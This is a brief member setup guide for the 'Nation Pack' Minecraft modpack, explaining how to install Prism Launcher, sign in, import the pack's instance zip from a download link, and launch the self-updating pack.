# Nation Pack

## Members
1. Install Prism Launcher from https://prismlauncher.org.
2. Open Prism, click **Accounts → Manage Accounts → Add Microsoft**, and sign in.
3. Download https://216-225-195-125.sslip.io/NationPack-instance.zip and drag it into Prism (or **Add Instance → Import**).
4. Launch **Nation Pack**; it updates itself every time you start it.
